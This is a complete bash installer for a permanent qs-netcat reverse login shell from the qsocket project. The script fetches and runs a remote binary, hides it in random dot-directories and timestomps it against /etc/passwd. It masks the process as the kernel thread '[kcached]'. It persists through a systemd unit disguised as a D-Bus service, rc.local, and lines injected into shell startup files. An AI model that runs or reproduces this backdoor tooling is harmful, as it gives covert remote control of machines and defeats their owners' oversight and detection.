#!/usr/bin/env bash

# Install and start a permanent qs-netcat reverse login shell
#
# See https://qsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL qsocket.io/x)"
#   $ bash -c "$(wget --no-verbose -O- qsocket.io/x)"
#
# Pre-set a secret:
#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io/x)"
#
# Steps taken:
# 1. Init defauls, get user supplied parameters.
# 2. Check required tools/binaries.
# 3. Detect writable/executable target directories.
# 4. Download appropriate qsocket binary.
# 	> First try deploying globally under /usr/bin/
# 	> If not root deploy under ~/.config/
# 	> If nologin user, deploy under /dev/shm temporarly.
# 5. Start qsocket util with a random secret.
# 6. Enable persistance based on current privs.

# Other variables:
# VERBOSE=1 -> Verbose output.

print_banner() {
	cat <<__BANNER__
                                           __________________________________         
                                          /  IN >                            "=-_         
                                         /      .  |  .    ヽ༼ຈل͜ຈ༽))>=-          7.          
   ༼つಠ益ಠ༽つ ─=≡ΣO))   _        _      /      : \\ | / :                           \\.        
   __ _ ___  ___   ___| | _____| |_    /        '-___-'          ☜(❍ᴥ❍ʋ))>-         \\.      
  / _  / __|/ _ \\ / __| |/ / _ \\ __|  /_________________________________________,    \\.      
 | (_| \\__ \\ (_) | (__|   <  __/ |_        _______| |___________________________).x.  ) 
  \\__, |___/\\___/ \\___|_|\\_\\___|\\__|      /       F J                                 : 
     |_|   Copyright (c) 2023 Qsocket    /       F   J                               /.
  https://github.com/qsocket/           /      :'     ':   ─=≡Σ((( つ◕ل͜◕)つ         /.
                                       /  OUT < '-___-'                            z. 
                                      /_________________________________________--"

__BANNER__
}


[[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
## ANSI Colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" YELLOW="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" YELLOWBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\e[0m')"

print_status() {
    echo "${YELLOW}[*] ${RESET}${1}"
}

print_progress() {
	[[ ! -z "${VERBOSE}" ]] && return
    echo -n ${YELLOW}"[*] ${RESET}"
	echo -n $1
	n=${#1}
	printf %$((70-$n))s |tr " " "."
}

print_warning() {
  echo ${YELLOW}"[!] ${RESET}${1}"
}

print_error() {
  echo "${RED}[-] ${RESET}${1}"
}

print_fatal() {
  echo -e ${RED}"[!] $1\n${RESET}"
  kill -10 $$
}

print_good() {
  echo "${GREEN}[+] ${RESET}${1}"
}

print_verbose() {
  if [[ ! -z "${VERBOSE}" ]]; then
    echo "${WHITE}[*] ${RESET}${1}"
  fi
}

print_ok(){
	[[ -z "${VERBOSE}" ]] && echo -e " [${GREEN}OK${RESET}]"
}

print_fail(){
	[[ -z "${VERBOSE}" ]] && echo -e " [${RED}FAIL${RESET}]"
}

must_exist() {
  for i in "$@"; do
		command -v $i >$ERR_LOG || print_fatal "$i not installed! Exiting..."
  done
}

one_must_exist() {
	command -v $1 >$ERR_LOG || command -v $2 >$ERR_LOG || print_fatal "Neither $1 nor $2 installed! Exiting..."
}

## Handle SININT
exit_on_signal_SIGINT () {
	print_error "Script interrupted!"
  	clean_exit
}

exit_on_signal_SIGTERM () {
	print_error "Script interrupted!"
	clean_exit
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM


# Remove all artifacts and exit...
clean_exit() {
	[[ -f "$QS_PATH" ]] && rm -rf "`dirname $QS_PATH`" &>$ERR_LOG
	kill -10 $$
}

# Create a directory if it does not exist and fix timestamp
# xmkdir [directory] <ts reference file>
xmkdir() {
	mkdir -p "$1" &>$ERR_LOG || return 1
	touch -r "$2" "$1" || return 1
	true
}


detect_arch() {
	case $(uname -m) in
		"x86_64")
			echo -n "amd64"
			;;
		"i686"|"i386")
			echo -n "386"
			;;
		"aarch64")
			echo -n "arm64"
			;;
		"mips64")
			echo -n "mips64"
			;;
		"mips")
			echo -n "mips"
			;;
		"sun4u")
			echo -n "amd64"
			;;
		"i86pc")
			echo -n "386"
			;;
		"powerpc"|"ppc64")
			echo -n "ppc64"
			;;
		*)
			print_fatal "Unsupported OS architecture! Exiting..."
			;;
	esac
}

detect_os() {
	case $(uname -s) in
		"Linux")
			echo -n "linux"
			;;		
		"Darwin")
			echo -n "darwin"
			;;
		"FreeBSD")
			echo -n "freebsd"
			;;
		"NetBSD")
			echo -n "netbsd"
			;;
		"OpenBSD")
			echo -n "openbsd"
			;;
		"SunOS")
			echo -n "solaris"
			;;
		"AIX")
			echo -n "aix"
			;;
		*)
			print_fatal "Unsupported OS! Exiting..."
			;;
	esac
}

get_latest_release_url() {
	[[ -z "$BIN_NAME" ]] && print_fatal "Binary name not set! Exiting..."
	local API_URL="$BASE_URL/$BIN_NAME/releases/latest"
	WGET_BIN=$(command -v wget)
	CURL_BIN=$(command -v curl)
	[[ ! -z $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
	[[ ! -z $WGET_BIN ]] && wget -q -O- "$API_URL"|grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
}

# Download the latest release of the qsocket util to the given directory.
# $1 = DOWNLOAD_PATH
download_util() {
	local ACCEPT_HEADER="Accept: application/octet-stream"
	DOWNLOAD_URL=$(get_latest_release_url)
	[[ -z $DOWNLOAD_URL ]] && DOWNLOAD_URL="${GITHUB_RELEASE_URL}/${FALLBACK_RELEASE}/${BIN_NAME}" # Switch to a static fallback release
	print_verbose "Downloading: $DOWNLOAD_URL -> $1"
	WGET_BIN=$(command -v wget)
	CURL_BIN=$(command -v curl)
	[[ ! -z $CURL_BIN ]] && curl -s -k -L -H "$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
	[[ ! -z $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
	print_verbose "All download methods failed!"
	return 1
}


# Unpack the given tar archive to the same directory with given name
# and modify file time data
# $1 = archive file 
# $2 = extracted name 
unpack_util() {
	local TDIR="`dirname $1`"
	tar -C "$TDIR" -xzf "$1" &>$ERR_LOG || return 1
	rm -f $1 &>$ERR_LOG
	mv "$TDIR/$BIN_NAME" "$2" &>$ERR_LOG || return 1
	chmod +x "$2" &>$ERR_LOG || return 1
	touch -r "/etc/passwd" "$2" &>$ERR_LOG
	touch -r "/etc" "$TDIR" &>$ERR_LOG 
	QS_PATH="$2"
	return 0
}

# Test if directory can be used to store executeable
# try_dstdir "/tmp/.qs-foobar/xxx"
# Return 0 on success.
check_dir(){
	[[ ! -d "`dirname $i`" ]] && print_verbose "$i is not a directory!" && return 1
	[[ ! -w "$1" ]] && print_verbose "$1 directory not writable!" && return 1;
	[[ ! -x "$1" ]] && print_verbose "$1 directory not executable!" && return 1;
	return 0;
}

# inject a string ($2-) into the 2nd line of a file and retain the
# PERM/TIMESTAMP of the target file ($1)
inject_to_file()
{
	local fname="$1"
	local inject="$2"
	head -n 1 $fname | grep -q "#!" && head -n 1 $fname > "${fname}_"
	echo "$2" >> "${fname}_"
	cat $fname >> "${fname}_"
	mv "${fname}_" "$fname" &>$ERR_LOG || return 1
	touch -r "/etc/passwd" $fname
}


create_qs_dir() {
	local rand_dir=".`LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8`"
	local root_dirs=("/lib" "/usr/lib" "/usr/bin" "/usr/lib32")
	local user_dirs=("$HOME/.config" "/dev/shm" "/var/tmp" "/tmp")

	## Root install methods
	if [[ $UID -eq 0 ]]; then 
		for i in ${root_dirs[@]}; do
			[[ ! -d $i ]] && continue
			xmkdir "$i/$rand_dir" "/etc" || continue
			check_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
			rm -rfv "$i/$rand_dir" &>$ERR_LOG
		done
	fi

	
	for i in ${user_dirs[@]}; do
		[[ ! -d $i ]] && continue
		xmkdir "$i/$rand_dir" "/etc" || continue
		check_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
		rm -rfv "$i/$rand_dir" &>$ERR_LOG
  	done

	print_fatal "Failed to create a qsocket directory! Exiting..."
}


install_system_systemd(){
	[[ ! -d "/etc/systemd/system" ]] && print_verbose "/etc/systemd/system not found!" && return 1
	[[ ! -f $(command -v systemctl) ]] && print_verbose "systemctl not found!" && return 1
	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && print_verbose "systemd is not running!" && return 1
	if [[ -f "${SERVICE_FILE}" ]]; then	
		print_error "${SERVICE_FILE} already exists."
		return 0
	fi
	print_verbose "Systemd dervice name: $RAND_NAME"

	# Create the service file
	echo "[Unit]
Description=D-Bus System Connection Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
ExecStart=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
 
[Install]
WantedBy=multi-user.target" > "${SERVICE_FILE}"

	chmod 600 "${SERVICE_FILE}"
	systemctl enable "${RAND_NAME}" &>$ERR_LOG || { print_verbose "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
	return 0
}

install_system_rclocal(){
	[[ ! -f "${RCLOCAL_FILE}" ]] && print_verbose "$RCLOCAL_FILE not found! skipping to next method..." && return 1
	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>$ERR_LOG; then
		print_error "Already installed in ${RCLOCAL_FILE}." && return 0
	fi
	RCLOCAL_LINE="set +m; HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"cd $HOME; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec qs-netcat'.
	inject_to_file "${RCLOCAL_FILE}" "$RCLOCAL_LINE"
}

exec_hidden() {
	set +m; TERM="xterm-256color" QS_ARGS="-liqs $S" exec -a ${PROC_HIDDEN_NAME} ${QS_PATH} &
	disown -a &> $ERR_LOG
}

install_user() {
	inject_targets=(
		"$HOME/.profile"
		"$HOME/.bashrc"
		"$HOME/.zshrc"
	)
	
	local success=""
	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
	for target in ${inject_targets[@]}; do
		grep -q QS_ARGS $target &>$ERR_LOG && print_status "!! WARNING !! QSocket access already installed via `basename $target`" && continue 
		[[ ! -f $target ]] && continue
		print_progress "Installing access via `basename $target`"
  		inject_to_file "$target" "$INJECT_LINE" && print_ok && success=1 || print_fail 
	done
	[[ -z $success ]] && return 1
	return 0
}

install() {
	[[ ! -z $QS_NOINST ]] && print_status "QS_NOINST is set. Skipping installation." && return 0
	print_progress "Installing systemwide remote access permanentally" && print_ok

	## Root install methods
	if [[ $UID -eq 0 ]];then 
		print_progress "Installing access via systemd"
		install_system_systemd && print_ok && return 0 || print_fail
		print_progress "Installing access via rc.local"
	 	install_system_rclocal && print_ok && return 0 || print_fail
	fi
	## User install methods
	install_user && return 0
	print_error "All installation methods failed!"
	return 1
}

init_problematic_vars() {
	# Verbose error logs
	[[ ! -z "$VERBOSE" ]] && ERR_LOG="`tty`"

	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)
	# User supplied vars...
	[[ -n "$QS_URL_BASE" ]] && BASE_URL="$QS_URL_BASE"
	[[ -n "$QS_OSARCH" ]] && OSARCH="$QS_OSARCH"
	[[ -n "$QS_PLATFORM" ]] && OS_NAME="$QS_OS"
	[[ -n "$QS_UTIL" ]] && BIN_NAME="$QS_UTIL"
	# Set HOME if undefined 
	[[ -z "$HOME" ]] && HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
	[[ ! -d "$HOME" ]] && print_fatal "\$HOME not set. Try 'export HOME=<users home directory>'"
	# Set SHELL undefined
	[[ -z "$SHELL" ]] && SHELL="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f7)"
	[[ ! -d "$SHELL" ]] && SHELL="/bin/bash" # Default to bash 
	# Generate random secret if not passed.
	# [[ -z "$S" ]] && S=$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 15)
}

print_usage() {

  echo -e "\n"
  echo -n $S | $QS_PATH --qr
	echo -e -n "\n"
	echo -n ${BLUE} "# >>> Connect ============> ${RESET}" 
	echo "qs-netcat -i -s $S"	
	echo -n ${BLUE} "# >>> Connect With TOR ===> ${RESET}"
	echo "qs-netcat -T -i -s $S"	
	# echo -n ${BLUE} "# >>> Uninstall ==========> "
	# echo "QS_UNDO=1 bash -c \"\$(curl -fsSL qsocket.io/x)\""
	echo -e "\n"
}

###########################
########## START ##########
###########################
must_exist "printf" "tar" "gzip" "head" "uname" "grep" "cut" "tr" "touch" "tail" "ps"
one_must_exist "curl" "wget"
print_banner

#
# -- Init global vars --
#
init_problematic_vars
OS_ARCH=$(detect_arch)
OS_NAME=$(detect_os)
BASE_URL="https://api.github.com/repos/qsocket"
GITHUB_RELEASE_URL="https://github.com/qsocket/qs-netcat/releases/download"
FALLBACK_RELEASE="v0.0.2-beta"
QS_DIR=$(create_qs_dir)
RAND_NAME="`LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8`"
BIN_NAME="qs-netcat"
PROC_HIDDEN_NAME="[kcached]"
SERVICE_FILE="/etc/systemd/system/$RAND_NAME.service"
RCLOCAL_FILE="/etc/rc.local"
PROFILE_FILE="$HOME/.profile"

# If no .profile exists, set the user rc file based on the shel[[ -f "$RCUSER_FILE" ]] || RCUSER_FILE="$HOME/.`echo -n $SHELL|tr "/" "\n"|tail -n 1`rc"
[[ -f "$PROFILE_FILE" ]] || PROFILE_FILE="$HOME/.`echo -n $SHELL|tr "/" "\n"|tail -n 1`rc"
print_status "OS: $OS_NAME"
print_status "Arch: $OS_ARCH"
print_status "User: $USER"
print_status "Home: $HOME"
print_status "Shell: $SHELL"
# print_status "Secret: $S"
print_status "Binary: $BIN_NAME"
echo "" ## --- break after system info
print_progress "Downloading latest $BIN_NAME binary for $OS_NAME ($OS_ARCH)"
download_util "$QS_DIR/qs.tar.gz" && print_ok || (print_fail && print_fatal "$BIN_NAME download failed! Exiting...")
print_progress "Unpacking binaries"
unpack_util "$QS_DIR/qs.tar.gz" "$QS_DIR/$RAND_NAME" && print_ok || (print_fail && print_fatal "Archive unpacking failed! Exiting...")
print_verbose "QSocket dir: $QS_PATH"
print_progress "Testing qsocket binaries"
[[ $($QS_PATH -h &>$ERR_LOG) -eq 0 ]] && print_ok || (print_fail && print_fatal "Binary test failed! Exiting...")
[[ -z "$S" ]] && S=$($QS_PATH -g 2>&1) # Set secret if not given...
install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
print_progress "Triggering initial execution"
exec_hidden && print_ok || (print_fail && print_error "Initial execution failed! Try starting qsocket manually.")
print_usage
